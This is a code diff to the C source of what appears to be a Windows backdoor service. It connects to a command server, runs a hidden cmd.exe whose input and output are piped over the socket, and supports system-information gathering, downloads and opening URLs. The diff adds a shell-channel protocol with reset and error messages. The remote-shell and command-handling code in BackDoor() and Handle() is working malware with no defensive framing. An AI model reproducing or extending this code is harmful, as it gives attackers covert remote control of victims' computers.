@@ -4,6 +4,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <wininet.h>
+// #include <process.h>
 
 // GCC lwininet ws2_32
 #pragma comment(lib, "ws2_32.lib")
@@ -16,17 +17,27 @@
 #define bool                                   BOOL
 #define ERROR_SUCCESS                           0L
 #define SERVER_HEARTS                           0
+#define SERVER_RESET                            1
 #define SERVER_SHELL                            2
+#define SERVER_SHELL_CHANNEL                    3
 #define SERVER_DOWNLOAD                         4
 #define SERVER_OPENURL                          8
 #define SERVER_SYSTEMINFO                       10
+
+               
+#define SERVER_SHELL_ERROR                      12
 // int WINAPI MessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
 void WINAPI BDHandler(DWORD dwControl);
 void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
 char const FLAG_[15] = "yyyyyyyyyyyyyyy";
 char const address[] = "127.0.0.1";
 char const port[] = "81";
-char const sign[10] = "customize";
+char const SIGN[10] = "customize";
+
+SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
+    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
+SECURITY_ATTRIBUTES saIn, saOut;
+
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE ServiceStatusHandle;
 struct CMSG{
@@ -249,10 +260,9 @@ char* getSystemInfomation(char* systeminfo){
 }
 //-------------------------SYSTEM INFOMATION END-----------------------------------------------------
 
-
 void BackDoor(SOCKET sock){
     
-    
+    printf("backdoor\n");
     int ret;
     char Buff[1024]; 
     SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
@@ -271,7 +281,7 @@ void BackDoor(SOCKET sock){
     si.wShowWindow=SW_HIDE; 
     si.hStdInput=hReadPipe2; 
     si.hStdOutput=si.hStdError=hWritePipe1; 
-    char cmdline[]="powershell.exe"; 
+    char cmdline[]="cmd.exe"; 
     PROCESS_INFORMATION ProcessInformation; 
     ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 
 
@@ -284,26 +294,75 @@ void BackDoor(SOCKET sock){
         { 
             
             ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
-            if (!ret) break; 
+            printf("ret: %d read:\n%s\n",ret,Buff);
+            if (!ret) {
+                struct CMSG emsg = {
+                    .sign =  "customize",
+                    .mod = SERVER_SHELL_ERROR,
+                    .msg_l = 0
+                    };
+                send(sock,(char*)&emsg,sizeof(struct CMSG),0);
+            }
+            struct CMSG msg = {
+                .sign =  "customize",
+                .mod = SERVER_SHELL_CHANNEL,
+                .msg_l = strlen(Buff)
+             };
+            send(sock,(char*)&msg,sizeof(struct CMSG),0);
             ret=send(sock,Buff+'\0',lBytesRead,0);
-            printf("Send:\n%sSendEnd\n",Buff);
+            printf("Send:\n%s\nSendEnd\n",Buff);
+            ZeroMemory(Buff,1024);
             if (ret<=0) break; 
         } else { 
-            lBytesRead=recv(sock,Buff,1024,0);
-            printf("Recv:\n%s\nRecvEnd\n",Buff);
-            
+            char * address = malloc(sizeof(struct CMSG));
+            recv(sock,address,sizeof(struct CMSG),0);
+            struct CMSG msg = *(struct CMSG*)address;
+            free(address);
+            switch (msg.mod){
+                case SERVER_HEARTS:
+                    continue;
+                case SERVER_SHELL_CHANNEL:{
+                    lBytesRead=recv(sock,Buff,1024,0);
+                    printf("Recv Len:%d Recv:\n%s\nRecvEnd\n",lBytesRead,Buff);
 
-            if (lBytesRead<=0 || strcmp(Buff,"reset")) {
-                break;
-            }//没数据or服务器退出(mod:1) 
-            ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0); 
-            if (!ret) break; 
-            if (ret<=0)break;
+                    if (lBytesRead<=0) {
+                        break;
+                    }//没数据or服务器退出(mod:1) 
+                    Buff[lBytesRead]='\n';
+                    Buff[lBytesRead+1]=0;
+                    printf("[");
+                    int len= strlen(Buff); 
+                    for (int i = 0; i < len; ++i) 
+                    {
+                        printf("%d ", Buff[i]);
+                    }
+                    printf("]\n");
+                    ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
+
+                    ZeroMemory(Buff,1024);
+                    if (!ret) break; 
+                    if (ret<=0)break;
+                    Sleep(600);
+                    continue;
+                }
+                case SERVER_RESET:{
+                    struct CMSG emsg = {
+                    .sign =  "customize",
+                    .mod = SERVER_RESET,
+                    .msg_l = 0
+                    };
+                    send(sock,(char*)&emsg,sizeof(struct CMSG),0);
+                	return;  
+                }
+
+            }
+            
             // Sleep(600);
         }
     }
     return;
 }
+
 
 void Handle(){
     WSADATA WSAData;
@@ -343,7 +402,7 @@ void Handle(){
         if(ret == -1){
             break;
         }
-        if (strcmp(msg.sign,sign) != 0){
+        if (strcmp(msg.sign,SIGN) != 0){
             printf("echo debug dafa hao");
             continue;
         }
